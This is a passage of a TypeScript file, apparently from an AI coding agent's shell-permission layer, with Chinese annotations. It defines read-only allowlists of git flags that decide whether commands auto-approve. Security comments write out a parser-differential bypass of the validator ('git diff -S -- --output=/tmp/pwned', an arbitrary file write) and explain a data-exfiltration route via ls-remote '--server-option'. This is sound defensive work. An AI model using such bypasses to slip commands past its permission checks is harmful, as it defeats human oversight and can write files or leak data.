/**
 * Shared command validation maps for shell tools (BashTool, PowerShellTool, etc.).
 *
 * Exports complete command configuration maps that any shell tool can import:
 * - GIT_READ_ONLY_COMMANDS: all git subcommands with safe flags and callbacks
 * - GH_READ_ONLY_COMMANDS: ant-only gh CLI commands (network-dependent)
 * - EXTERNAL_READONLY_COMMANDS: cross-shell commands that work in both bash and PowerShell
 * - containsVulnerableUncPath: UNC path detection for credential leak prevention
 * - outputLimits are in outputLimits.ts
 */

// 本文件是「只读命令白名单」的共享数据库：把 git / gh / docker / rg / pyright 的每个子命令允许哪些标志、哪些参数形态、什么情况下必须判危险，全部写成可被 BashTool 与 PowerShellTool 共同 import 的声明式表。它只回答「这条命令按字面看是否写盘/发网络」，不做上下文判断；调用方负责 token 化与命令名归一。
import { getPlatform } from '../platform.js'

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export type FlagArgType =
  | 'none' // No argument (--color, -n)
  | 'number' // Integer argument (--context=3)
  | 'string' // Any string argument (--relative=path)
  | 'char' // Single character (delimiter)
  | '{}' // Literal "{}" only
  | 'EOF' // Literal "EOF" only
// `FlagArgType` 的六种参数类型是整套校验的语义基础。关键在 `none`：它声明「该标志不吃参数」。一旦真实程序认为它吃参数，校验器就会少消费一个 token，剩下的 token 被当成位置参数放行——这正是文件里反复出现的 parser differential（解析差）攻击的通用形态。所以这里每一种类型都必须与程序真实的 getopt 声明严格一致，宁可选更宽的 `string` 也不能错标成 `none`。

export type ExternalCommandConfig = {
  safeFlags: Record<string, FlagArgType>
  // Returns true if the command is dangerous, false if safe.
  // args is the list of tokens AFTER the command name (e.g., after "git branch").
  additionalCommandIsDangerousCallback?: (
    rawCommand: string,
    args: string[],
  ) => boolean
  // When false, the tool does NOT respect POSIX `--` end-of-options.
  // validateFlags will continue checking flags after `--` instead of breaking.
  // Default: true (most tools respect `--`).
  respectsDoubleDash?: boolean
// `ExternalCommandConfig` 三件套：`safeFlags` 是标志白名单；`additionalCommandIsDangerousCallback` 处理「标志都合法但组合起来危险」的情形（例如 `git tag foo` 创建标签）；`respectsDoubleDash` 声明该程序是否遵守 POSIX 的双短横线终止符约定。第三个字段常被忽略，但它是 pyright 那类「把双短横线当文件名」的工具的唯一防线。
}

// ---------------------------------------------------------------------------
// Shared git flag groups
// ---------------------------------------------------------------------------

const GIT_REF_SELECTION_FLAGS: Record<string, FlagArgType> = {
  '--all': 'none',
  '--branches': 'none',
  '--tags': 'none',
  '--remotes': 'none',
}
// 引用选择标志组：只挑提交范围、不改仓库。抽成常量是为了让 `git log` / `git show` / `git rev-list` / `git stash list` 共享同一份定义，避免某处漏一个标志导致同一语义在不同子命令下判定不一致。

const GIT_DATE_FILTER_FLAGS: Record<string, FlagArgType> = {
  '--since': 'string',
  '--after': 'string',
  '--until': 'string',
  '--before': 'string',
}

const GIT_LOG_DISPLAY_FLAGS: Record<string, FlagArgType> = {
  '--oneline': 'none',
  '--graph': 'none',
  '--decorate': 'none',
  '--no-decorate': 'none',
  '--date': 'string',
  '--relative-date': 'none',
}

const GIT_COUNT_FLAGS: Record<string, FlagArgType> = {
  '--max-count': 'number',
  '-n': 'number',
}
// 计数标志组 `--max-count` 与 `-n` 都声明为 `number`，不是 `none`——它们要吃一个数字。若误标 `none`，`git log -n --output=/tmp/x` 这类构造就会让校验器在 `-n` 处只前进一格，把后面整个标志当位置参数放过。

// Stat output flags - used in git log, show, diff
const GIT_STAT_FLAGS: Record<string, FlagArgType> = {
  '--stat': 'none',
  '--numstat': 'none',
  '--shortstat': 'none',
  '--name-only': 'none',
  '--name-status': 'none',
}

// Color output flags - used in git log, show, diff
const GIT_COLOR_FLAGS: Record<string, FlagArgType> = {
  '--color': 'none',
  '--no-color': 'none',
}

// Patch display flags - used in git log, show
const GIT_PATCH_FLAGS: Record<string, FlagArgType> = {
  '--patch': 'none',
  '-p': 'none',
  '--no-patch': 'none',
  '--no-ext-diff': 'none',
  '-s': 'none',
}

// Author/committer filter flags - used in git log, reflog
const GIT_AUTHOR_FILTER_FLAGS: Record<string, FlagArgType> = {
  '--author': 'string',
  '--committer': 'string',
  '--grep': 'string',
}
// 作者/提交者过滤组都被标成 `string`，因为它们的值可以任意，包括以 `-` 开头的字符串；下面的主循环对 `string` 有「值以 `-` 开头就拒绝」的兜底，唯一例外是 git 的反向排序键，所以这里不需要额外回调。

// ---------------------------------------------------------------------------
// GIT_READ_ONLY_COMMANDS — complete map of all git subcommands
// ---------------------------------------------------------------------------

export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
  'git diff': {
    safeFlags: {
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      // Display and comparison flags
      '--dirstat': 'none',
      '--summary': 'none',
      '--patch-with-stat': 'none',
      '--word-diff': 'none',
      '--word-diff-regex': 'string',
      '--color-words': 'none',
      '--no-renames': 'none',
      '--no-ext-diff': 'none',
      '--check': 'none',
      '--ws-error-highlight': 'string',
      '--full-index': 'none',
      '--binary': 'none',
      '--abbrev': 'number',
      '--break-rewrites': 'none',
      '--find-renames': 'none',
      '--find-copies': 'none',
      '--find-copies-harder': 'none',
      '--irreversible-delete': 'none',
      '--diff-algorithm': 'string',
      '--histogram': 'none',
      '--patience': 'none',
      '--minimal': 'none',
      '--ignore-space-at-eol': 'none',
      '--ignore-space-change': 'none',
      '--ignore-all-space': 'none',
      '--ignore-blank-lines': 'none',
      '--inter-hunk-context': 'number',
      '--function-context': 'none',
      '--exit-code': 'none',
      '--quiet': 'none',
      '--cached': 'none',
      '--staged': 'none',
      '--pickaxe-regex': 'none',
      '--pickaxe-all': 'none',
      '--no-index': 'none',
      '--relative': 'string',
      // Diff filtering
      '--diff-filter': 'string',
      // Short flags
      '-p': 'none',
      '-u': 'none',
      '-s': 'none',
      '-M': 'none',
      '-C': 'none',
      '-B': 'none',
      '-D': 'none',
      '-l': 'none',
// 短标志区：`-M`/`-C`/`-B`/`-D`/`-l`/`-R` 全部是「开关型」，无参数。对照 `git log` 里的 `-S`：同样是单字母，但 `-S` 吃一个字符串。这种同字母异义正是必须逐子命令建表、不能建全局短标志表的原因。
      // SECURITY: -S/-G/-O take REQUIRED string arguments (pickaxe search,
      // pickaxe regex, orderfile). Previously 'none' caused a parser
      // differential with git: `git diff -S -- --output=/tmp/pwned` —
      // validator sees -S as no-arg → advances 1 token → breaks on `--` →
      // --output unchecked. git sees -S requires arg → consumes `--` as the
      // pickaxe string (standard getopt: required-arg options consume next
      // argv unconditionally, BEFORE the top-level `--` check) → cursor at
      // --output=... → parses as long option → ARBITRARY FILE WRITE.
      // git log config at line ~207 correctly has -S/-G as 'string'.
// 这一段是本文件最贵的注释，记录了一次真实的任意文件写漏洞：`git diff -S -- --output=/tmp/pwned`。校验器原先把 `-S` 标成 `none`，于是只前进一格、随后在双短横线处 `break`，把 `--output=` 当作「双短横线之后的参数」完全不再检查；而 git 的 getopt 认为必需参数选项会无条件吞掉下一个 argv（在双短横线判定之前），于是 `--` 成了 pickaxe 的搜索串，`--output=` 变成真正的长选项——写任意文件。修法就是把 `-S`/`-G`/`-O` 改成 `string`，与 `git log` 处保持一致。
      '-S': 'string',
      '-G': 'string',
      '-O': 'string',
      '-R': 'none',
    },
// `git diff` 条目收尾。注意 `--relative` 是 `string`（可带路径），`--diff-filter` 也是 `string`（值是 A/M/D 组合），而 `--no-index` 虽是「比较任意两个文件」，仍只读——它不写盘，所以允许。
  },
  'git log': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      ...GIT_COUNT_FLAGS,
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      ...GIT_PATCH_FLAGS,
      ...GIT_AUTHOR_FILTER_FLAGS,
      // Additional display flags
      '--abbrev-commit': 'none',
      '--full-history': 'none',
      '--dense': 'none',
      '--sparse': 'none',
      '--simplify-merges': 'none',
      '--ancestry-path': 'none',
      '--source': 'none',
      '--first-parent': 'none',
      '--merges': 'none',
      '--no-merges': 'none',
      '--reverse': 'none',
      '--walk-reflogs': 'none',
      '--skip': 'number',
      '--max-age': 'number',
      '--min-age': 'number',
      '--no-min-parents': 'none',
      '--no-max-parents': 'none',
      '--follow': 'none',
      // Commit traversal flags
      '--no-walk': 'none',
      '--left-right': 'none',
      '--cherry-mark': 'none',
      '--cherry-pick': 'none',
      '--boundary': 'none',
      // Ordering flags
      '--topo-order': 'none',
      '--date-order': 'none',
      '--author-date-order': 'none',
      // Format control
      '--pretty': 'string',
      '--format': 'string',
      // Diff filtering
      '--diff-filter': 'string',
      // Pickaxe search (find commits that add/remove string)
      '-S': 'string',
      '-G': 'string',
      '--pickaxe-regex': 'none',
      '--pickaxe-all': 'none',
    },
// `git log` 的完整标志面。这里 `--pretty` / `--format` 是 `string`：它们能把内容格式化输出，但不落盘。真正的风险点是 `--output` 类选项从未被列入，配合上面的 `-S` 修正才闭环。
  },
  'git show': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      ...GIT_PATCH_FLAGS,
      // Additional display flags
      '--abbrev-commit': 'none',
      '--word-diff': 'none',
      '--word-diff-regex': 'string',
      '--color-words': 'none',
      '--pretty': 'string',
      '--format': 'string',
      '--first-parent': 'none',
      '--raw': 'none',
      // Diff filtering
      '--diff-filter': 'string',
      // Short flags
      '-m': 'none',
      '--quiet': 'none',
    },
  },
// `git show` 与 log 高度重叠，但少了引用选择组（它只显示指定对象）。`-m` 用于合并提交分开展示，仍是纯读。
  'git shortlog': {
    safeFlags: {
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      // Summary options
      '-s': 'none',
      '--summary': 'none',
      '-n': 'none',
      '--numbered': 'none',
      '-e': 'none',
      '--email': 'none',
      '-c': 'none',
      '--committer': 'none',
      // Grouping
      '--group': 'string',
      // Formatting
      '--format': 'string',
      // Filtering
      '--no-merges': 'none',
      '--author': 'string',
    },
  },
  'git reflog': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      ...GIT_COUNT_FLAGS,
      ...GIT_AUTHOR_FILTER_FLAGS,
    },
// `git reflog` 的关键防线不在标志上，而在位置参数：裸 `git reflog` 与 `git reflog show` 只读，但 `git reflog expire` / `delete` / `exists` 会改写 `.git/logs/**`。由于它们不是标志，`validateFlags` 的位置参数兜底会直接放行，必须靠下面的回调拦。
    // SECURITY: Block `git reflog expire` (positional subcommand) — it writes
    // to .git/logs/** by expiring reflog entries. `git reflog delete` similarly
    // writes. Only `git reflog` (bare = show) and `git reflog show` are safe.
    // The positional-arg fallthrough at ~:1730 would otherwise accept `expire`
    // as a non-flag arg, and `--all` is in GIT_REF_SELECTION_FLAGS → passes.
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // Block known write-capable subcommands: expire, delete, exists.
      // Allow: `show`, ref names (HEAD, refs/*, branch names).
      // The subcommand (if any) is the first positional arg. Subsequent
      // positionals after `show` or after flags are ref names (safe).
      const DANGEROUS_SUBCOMMANDS = new Set(['expire', 'delete', 'exists'])
      for (const token of args) {
        if (!token || token.startsWith('-')) continue
        // First non-flag positional: check if it's a dangerous subcommand.
        // If it's `show` or a ref name like `HEAD`/`refs/...`, safe.
        if (DANGEROUS_SUBCOMMANDS.has(token)) {
          return true // Dangerous subcommand — writes to .git/logs/**
        }
        // First positional is safe (show/HEAD/ref) — subsequent are ref args
        return false
      }
      return false // No positional = bare `git reflog` = safe (shows reflog)
    },
// 回调只检查「第一个非标志位置参数」就返回：因为 reflog 的子命令语法里子命令必定是第一个位置参数，其后的都是引用名（`HEAD`、`refs/...`），把后面也当子命令查会误杀 `git reflog show main`。这是「只校验语法上唯一的危险槽位」的典型写法——比逐个 token 猜语义更不容易出错。
  },
  'git stash list': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_COUNT_FLAGS,
    },
  },
// `git stash list` 只暴露展示类标志，`--max-count` 取自计数组。stash 的写操作（push/pop/apply/drop）根本没有条目，因此不需要回调兜底。
  'git ls-remote': {
    safeFlags: {
      // Branch/tag filtering flags
      '--branches': 'none',
      '-b': 'none',
      '--tags': 'none',
      '-t': 'none',
      '--heads': 'none',
      '-h': 'none',
      '--refs': 'none',
      // Output control flags
      '--quiet': 'none',
      '-q': 'none',
      '--exit-code': 'none',
      '--get-url': 'none',
      '--symref': 'none',
      // Sorting flags
      '--sort': 'string',
// 这里刻意不列 `--server-option` 与 `-o`，原因写在下方注释里：这两个选项会把任意字符串通过协议 v2 的能力公告发给远端，等于在一条「只读」命令上开了一个网络写原语。即使命令替换已被别处拦住，`--server-option=` 加上敏感值也足以把数据外泄到 `origin` 指向的任意服务器。只读路径永远不该具备网络写能力。
      // Protocol flags
      // SECURITY: --server-option and -o are INTENTIONALLY EXCLUDED. They
      // transmit an arbitrary attacker-controlled string to the remote git
      // server in the protocol v2 capability advertisement. This is a network
      // WRITE primitive (sending data to remote) on what is supposed to be a
      // read-only command. Even without command substitution (which is caught
      // elsewhere), `--server-option="sensitive-data"` exfiltrates the value
      // to whatever `origin` points to. The read-only path should never enable
      // network writes.
    },
  },
// `git ls-remote` 条目收尾：它是唯一「只读但必须联网」的 git 子命令，所以除了过滤与排序标志，其余一律不放行。
  'git status': {
    safeFlags: {
      // Output format flags
      '--short': 'none',
      '-s': 'none',
      '--branch': 'none',
      '-b': 'none',
      '--porcelain': 'none',
      '--long': 'none',
      '--verbose': 'none',
      '-v': 'none',
      // Untracked files handling
      '--untracked-files': 'string',
      '-u': 'string',
      // Ignore options
      '--ignored': 'none',
      '--ignore-submodules': 'string',
      // Column display
      '--column': 'none',
      '--no-column': 'none',
      // Ahead/behind info
      '--ahead-behind': 'none',
      '--no-ahead-behind': 'none',
      // Rename detection
      '--renames': 'none',
      '--no-renames': 'none',
      '--find-renames': 'string',
      '-M': 'string',
    },
  },
// `git status` 的 `-u` / `--untracked-files` 声明为 `string` 而非 `number`，因为它的合法值是 `no`/`normal`/`all` 这类枚举词，用 `number` 会把 `git status -u all` 判成缺参而误拒。宽松声明在这里是安全方向：值是枚举词，不可能变成危险标志。
  'git blame': {
    safeFlags: {
      ...GIT_COLOR_FLAGS,
      // Line range
      '-L': 'string',
      // Output format
      '--porcelain': 'none',
      '-p': 'none',
      '--line-porcelain': 'none',
      '--incremental': 'none',
      '--root': 'none',
      '--show-stats': 'none',
      '--show-name': 'none',
      '--show-number': 'none',
      '-n': 'none',
      '--show-email': 'none',
      '-e': 'none',
      '-f': 'none',
      // Date formatting
      '--date': 'string',
      // Ignore whitespace
      '-w': 'none',
      // Ignore revisions
      '--ignore-rev': 'string',
      '--ignore-revs-file': 'string',
      // Move/copy detection
      '-M': 'none',
      '-C': 'none',
      '--score-debug': 'none',
      // Abbreviation
      '--abbrev': 'number',
      // Other options
      '-s': 'none',
      '-l': 'none',
      '-t': 'none',
    },
  },
// `git blame` 的 `-L` 要一个行范围字符串（如 `1,20`），`--ignore-revs-file` 要一个文件路径——两者都只影响读哪些行，不产生写。
  'git ls-files': {
    safeFlags: {
      // File selection
      '--cached': 'none',
      '-c': 'none',
      '--deleted': 'none',
      '-d': 'none',
      '--modified': 'none',
      '-m': 'none',
      '--others': 'none',
      '-o': 'none',
      '--ignored': 'none',
      '-i': 'none',
      '--stage': 'none',
      '-s': 'none',
      '--killed': 'none',
      '-k': 'none',
      '--unmerged': 'none',
      '-u': 'none',
      // Output format
      '--directory': 'none',
      '--no-empty-directory': 'none',
      '--eol': 'none',
      '--full-name': 'none',
      '--abbrev': 'number',
      '--debug': 'none',
      '-z': 'none',
      '-t': 'none',
      '-v': 'none',
      '-f': 'none',
      // Exclude patterns
      '--exclude': 'string',
      '-x': 'string',
      '--exclude-from': 'string',
      '-X': 'string',
      '--exclude-per-directory': 'string',
      '--exclude-standard': 'none',
      // Error handling
      '--error-unmatch': 'none',
      // Recursion
      '--recurse-submodules': 'none',
    },
  },
// `git ls-files` 的排除模式组（`-x` / `-X` / `--exclude-from`）都是 `string`。`--recurse-submodules` 会进入子模块读取，仍属只读。
  'git config --get': {
    safeFlags: {
      // No additional flags needed - just reading config values
      '--local': 'none',
      '--global': 'none',
      '--system': 'none',
      '--worktree': 'none',
      '--default': 'string',
      '--type': 'string',
      '--bool': 'none',
      '--int': 'none',
      '--bool-or-int': 'none',
      '--path': 'none',
      '--expiry-date': 'none',
      '-z': 'none',
      '--null': 'none',
      '--name-only': 'none',
      '--show-origin': 'none',
      '--show-scope': 'none',
    },
  },
// 注意条目键是 `git config --get` 而非 `git config`：只把「读单个配置项」这个变体列入白名单，`git config key value`（写配置）与 `--unset` 等写变体都不存在条目，自然不会被匹配。这种「用更长的键名收窄语义」比在回调里判断子命令更可靠。
  // NOTE: 'git remote show' must come BEFORE 'git remote' so longer patterns are matched first
  'git remote show': {
    safeFlags: {
      '-n': 'none',
    },
    // Only allow optional -n, then one alphanumeric remote name
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // Filter out the known safe flag
      const positional = args.filter(a => a !== '-n')
      // Must have exactly one positional arg that looks like a remote name
      if (positional.length !== 1) return true
      return !/^[a-zA-Z0-9_-]+$/.test(positional[0]!)
    },
  },
// `git remote show` 必须排在 `git remote` 之前，否则前缀匹配会先命中短键。回调要求恰好一个位置参数且匹配 `[a-zA-Z0-9_-]+`——远程名里不允许点、斜杠、冒号，正是为了堵住把 URL 或 `host:path` 形态塞进远程名的外泄路径。
  'git remote': {
    safeFlags: {
      '-v': 'none',
      '--verbose': 'none',
    },
    // Only allow bare 'git remote' or 'git remote -v/--verbose'
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // All args must be known safe flags; no positional args allowed
      return args.some(a => a !== '-v' && a !== '--verbose')
    },
  },
// `git remote` 的回调反过来要求「不许有任何位置参数」：裸 `git remote` 与 `-v/--verbose` 只列远程，而 `git remote add/remove/set-url` 都会带位置参数，于是被这一条全覆盖。
  // git merge-base is a read-only command for finding common ancestors
  'git merge-base': {
    safeFlags: {
      '--is-ancestor': 'none', // Check if first commit is ancestor of second
      '--fork-point': 'none', // Find fork point
      '--octopus': 'none', // Find best common ancestors for multiple refs
      '--independent': 'none', // Filter independent refs
      '--all': 'none', // Output all merge bases
    },
  },
// `git merge-base` 找共同祖先，纯读。所有标志都是开关，没有位置参数校验：位置参数是提交引用，引用本身无法造成写入。
  // git rev-parse is a pure read command — resolves refs to SHAs, queries repo paths
  'git rev-parse': {
    safeFlags: {
      // SHA resolution and verification
      '--verify': 'none', // Verify that exactly one argument is a valid object name
      '--short': 'string', // Abbreviate output (optional length via =N)
      '--abbrev-ref': 'none', // Symbolic name of ref
      '--symbolic': 'none', // Output symbolic names
      '--symbolic-full-name': 'none', // Full symbolic name including refs/heads/ prefix
      // Repository path queries (all read-only)
      '--show-toplevel': 'none', // Absolute path of top-level directory
      '--show-cdup': 'none', // Path components to traverse up to top-level
      '--show-prefix': 'none', // Relative path from top-level to cwd
      '--git-dir': 'none', // Path to .git directory
      '--git-common-dir': 'none', // Path to common directory (.git in main worktree)
      '--absolute-git-dir': 'none', // Absolute path to .git directory
      '--show-superproject-working-tree': 'none', // Superproject root (if submodule)
      // Boolean queries
      '--is-inside-work-tree': 'none',
      '--is-inside-git-dir': 'none',
      '--is-bare-repository': 'none',
      '--is-shallow-repository': 'none',
      '--is-shallow-update': 'none',
      '--path-prefix': 'none',
    },
  },
// `git rev-parse` 是纯读的引用解析器，这里的重点是 `--short` 被标成 `string` 而不是 `number`——它既可以是开关也可以带 `=N` 长度，声明成 `string` 同时容纳两种形态，且值不会变成危险标志。
  // git rev-list is read-only commit enumeration — lists/counts commits reachable from refs
  'git rev-list': {
    safeFlags: {
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      ...GIT_COUNT_FLAGS,
      ...GIT_AUTHOR_FILTER_FLAGS,
      // Counting
      '--count': 'none', // Output commit count instead of listing
      // Traversal control
      '--reverse': 'none',
      '--first-parent': 'none',
      '--ancestry-path': 'none',
      '--merges': 'none',
      '--no-merges': 'none',
      '--min-parents': 'number',
      '--max-parents': 'number',
      '--no-min-parents': 'none',
      '--no-max-parents': 'none',
      '--skip': 'number',
      '--max-age': 'number',
      '--min-age': 'number',
      '--walk-reflogs': 'none',
      // Output formatting
      '--oneline': 'none',
      '--abbrev-commit': 'none',
      '--pretty': 'string',
      '--format': 'string',
      '--abbrev': 'number',
      '--full-history': 'none',
      '--dense': 'none',
      '--sparse': 'none',
      '--source': 'none',
      '--graph': 'none',
    },
  },
// `git rev-list` 是提交枚举，标志面与 log 类似但少了展示补丁那部分。`--count` 只输出数量，是最常用的只读形态。
  // git describe is read-only — describes commits relative to the most recent tag
  'git describe': {
    safeFlags: {
      // Tag selection
      '--tags': 'none', // Consider all tags, not just annotated
      '--match': 'string', // Only consider tags matching the glob pattern
      '--exclude': 'string', // Do not consider tags matching the glob pattern
      // Output control
      '--long': 'none', // Always output long format (tag-distance-ghash)
      '--abbrev': 'number', // Abbreviate objectname to N hex digits
      '--always': 'none', // Show uniquely abbreviated object as fallback
      '--contains': 'none', // Find tag that comes after the commit
      '--first-match': 'none', // Prefer tags closest to the tip (stops after first match)
      '--exact-match': 'none', // Only output if an exact match (tag points at commit)
      '--candidates': 'number', // Limit walk before selecting best candidates
      // Suffix/dirty markers
      '--dirty': 'none', // Append "-dirty" if working tree has modifications
      '--broken': 'none', // Append "-broken" if repository is in invalid state
    },
  },
// `git describe` 全部开关型，`--match`/`--exclude` 是 glob 字符串。`--dirty`/`--broken` 只是给输出加后缀，不改工作区——名字容易误解成写操作。
  // git cat-file is read-only object inspection — displays type, size, or content of objects
  // NOTE: --batch (without --check) is intentionally excluded — it reads arbitrary objects
  // from stdin which could be exploited in piped commands to dump sensitive objects.
  'git cat-file': {
    safeFlags: {
      // Object query modes (all purely read-only)
      '-t': 'none', // Print type of object
      '-s': 'none', // Print size of object
      '-p': 'none', // Pretty-print object contents
      '-e': 'none', // Exit with zero if object exists, non-zero otherwise
      // Batch mode — read-only check variant only
      '--batch-check': 'none', // For each object on stdin, print type and size (no content)
      // Output control
      '--allow-undetermined-type': 'none',
    },
  },
// `git cat-file` 只留 `--batch-check`（对 stdin 上每个对象只打印类型和大小），刻意排除 `--batch`：后者会把对象**内容**整段吐出来，在管道里就能把敏感对象灌进后续命令。同一个标志的两个变体，信息暴露量差一个量级。
  // git for-each-ref is read-only ref iteration — lists refs with optional formatting and filtering
  'git for-each-ref': {
    safeFlags: {
      // Output formatting
      '--format': 'string', // Format string using %(fieldname) placeholders
      // Sorting
      '--sort': 'string', // Sort by key (e.g., refname, creatordate, version:refname)
      // Limiting
      '--count': 'number', // Limit output to at most N refs
      // Filtering
      '--contains': 'string', // Only list refs that contain specified commit
      '--no-contains': 'string', // Only list refs that do NOT contain specified commit
      '--merged': 'string', // Only list refs reachable from specified commit
      '--no-merged': 'string', // Only list refs NOT reachable from specified commit
      '--points-at': 'string', // Only list refs pointing at specified object
    },
  },
// `git for-each-ref` 的过滤标志（`--contains`/`--merged`/`--points-at`）都是 `string`，值是提交引用。`--format` 用 `%(fieldname)` 占位符，只影响输出格式。
  // git grep is read-only — searches tracked files for patterns
  'git grep': {
    safeFlags: {
      // Pattern matching modes
      '-e': 'string', // Pattern
      '-E': 'none', // Extended regexp
      '--extended-regexp': 'none',
      '-G': 'none', // Basic regexp (default)
      '--basic-regexp': 'none',
      '-F': 'none', // Fixed strings
      '--fixed-strings': 'none',
      '-P': 'none', // Perl regexp
      '--perl-regexp': 'none',
      // Match control
      '-i': 'none', // Ignore case
      '--ignore-case': 'none',
      '-v': 'none', // Invert match
      '--invert-match': 'none',
      '-w': 'none', // Word regexp
      '--word-regexp': 'none',
      // Output control
      '-n': 'none', // Line number
      '--line-number': 'none',
      '-c': 'none', // Count
      '--count': 'none',
      '-l': 'none', // Files with matches
      '--files-with-matches': 'none',
      '-L': 'none', // Files without match
      '--files-without-match': 'none',
      '-h': 'none', // No filename
      '-H': 'none', // With filename
      '--heading': 'none',
      '--break': 'none',
      '--full-name': 'none',
      '--color': 'none',
      '--no-color': 'none',
      '-o': 'none', // Only matching
      '--only-matching': 'none',
      // Context
      '-A': 'number', // After context
      '--after-context': 'number',
      '-B': 'number', // Before context
      '--before-context': 'number',
      '-C': 'number', // Context
      '--context': 'number',
      // Boolean operators for multi-pattern
      '--and': 'none',
      '--or': 'none',
      '--not': 'none',
      // Scope control
      '--max-depth': 'number',
      '--untracked': 'none',
      '--no-index': 'none',
      '--recurse-submodules': 'none',
      '--cached': 'none',
      // Threads
      '--threads': 'number',
      // Quiet
      '-q': 'none',
      '--quiet': 'none',
    },
  },
// `git grep` 的标志面最宽：`-e` 取模式（`string`），上下文类 `-A`/`-B`/`-C` 取数字（`number`），匹配模式开关（`-E`/`-F`/`-P`/`-G`）全是 `none`。`-e` 是 `string` 这点很重要——如果标成 `none`，`git grep -e --output=x` 就会重演 `-S` 那套解析差。
  // git stash show is read-only — displays diff of a stash entry
  'git stash show': {
    safeFlags: {
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      ...GIT_PATCH_FLAGS,
      // Diff options
      '--word-diff': 'none',
      '--word-diff-regex': 'string',
      '--diff-filter': 'string',
      '--abbrev': 'number',
    },
  },
// `git stash show` 复用 diff 的标志组，只展示不应用。
  // git worktree list is read-only — lists linked working trees
  'git worktree list': {
    safeFlags: {
      '--porcelain': 'none',
      '-v': 'none',
      '--verbose': 'none',
      '--expire': 'string',
    },
  },
// `git worktree list` 里出现 `--expire` 是个可疑残留：`--expire` 属于 `git worktree prune`，`list` 并不接受它。它在这里的实际效果只是「遇到该标志时多消费一个 token」，既不会写盘也不会放过危险标志（后面没有其他可利用的槽位），但它说明「标志表是从邻近子命令抄来的」这一事实——抄错方向若反过来（把吃参数的标成不吃）就是漏洞。
  'git tag': {
    safeFlags: {
      // List mode flags
      '-l': 'none',
      '--list': 'none',
      '-n': 'number',
      '--contains': 'string',
      '--no-contains': 'string',
      '--merged': 'string',
      '--no-merged': 'string',
      '--sort': 'string',
      '--format': 'string',
      '--points-at': 'string',
      '--column': 'none',
      '--no-column': 'none',
      '-i': 'none',
      '--ignore-case': 'none',
    },
    // SECURITY: Block tag creation via positional arguments. `git tag foo`
    // creates .git/refs/tags/foo (41-byte file write) — NOT read-only.
    // This is identical semantics to `git branch foo` (which has the same
    // callback below). Without this callback, validateFlags's default
    // positional-arg fallthrough at ~:1730 accepts `mytag` as a non-flag arg,
    // and git tag auto-approves. While the write is constrained (path limited
    // to .git/refs/tags/, content is fixed HEAD SHA), it violates the
    // read-only invariant and can pollute CI/CD tag-pattern matching or make
    // abandoned commits reachable via `git tag foo <commit>`.
// `git tag` 的写入口是位置参数：`git tag foo` 会创建 `.git/refs/tags/foo`，`git tag foo <commit>` 还会让废弃提交重新可达。标志校验看不出这一点，必须由回调判定「位置参数前面有没有 `-l/--list`」。
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // Safe uses: `git tag` (list), `git tag -l pattern` (list filtered),
      // `git tag --contains <ref>` (list containing). A bare positional arg
      // without -l/--list is a tag name to CREATE — dangerous.
      const flagsWithArgs = new Set([
        '--contains',
        '--no-contains',
        '--merged',
        '--no-merged',
        '--points-at',
        '--sort',
        '--format',
        '-n',
      ])
      let i = 0
      let seenListFlag = false
      let seenDashDash = false
      while (i < args.length) {
        const token = args[i]
        if (!token) {
          i++
          continue
        }
        // `--` ends flag parsing. All subsequent tokens are positional args,
        // even if they start with `-`. `git tag -- -l` CREATES a tag named `-l`.
        if (token === '--' && !seenDashDash) {
          seenDashDash = true
          i++
          continue
        }
        if (!seenDashDash && token.startsWith('-')) {
          // Check for -l/--list (exact or in a bundle). `-li` bundles -l and
          // -i — both 'none' type. Array.includes('-l') exact-matches, missing
          // bundles like `-li`, `-il`. Check individual chars for short bundles.
          if (token === '--list' || token === '-l') {
            seenListFlag = true
          } else if (
            token[0] === '-' &&
            token[1] !== '-' &&
            token.length > 2 &&
            !token.includes('=') &&
            token.slice(1).includes('l')
          ) {
            // Short-flag bundle like -li, -il containing 'l'
            seenListFlag = true
          }
          if (token.includes('=')) {
            i++
          } else if (flagsWithArgs.has(token)) {
            i += 2
          } else {
            i++
          }
        } else {
          // Non-flag positional arg (or post-`--` positional). Safe only if
          // preceded by -l/--list (then it's a pattern, not a tag name).
          if (!seenListFlag) {
            return true // Positional arg without --list = tag creation
          }
          i++
        }
      }
      return false
    },
// 回调里两个细节值钱：一是短标志 bundle（`-li`、`-il`）也要认成列表模式，用 `token.slice(1).includes('l')` 逐字符查，否则 `git tag -li pattern` 会被误判成创建标签；二是双短横线之后语义反转——`git tag -- -l` 不是列表，而是**创建**一个名字叫 `-l` 的标签，所以 `seenDashDash` 之后所有 token 一律按位置参数处理。
  },
  'git branch': {
    safeFlags: {
      // List mode flags
      '-l': 'none',
      '--list': 'none',
      '-a': 'none',
      '--all': 'none',
      '-r': 'none',
      '--remotes': 'none',
      '-v': 'none',
      '-vv': 'none',
      '--verbose': 'none',
      // Display options
      '--color': 'none',
      '--no-color': 'none',
      '--column': 'none',
      '--no-column': 'none',
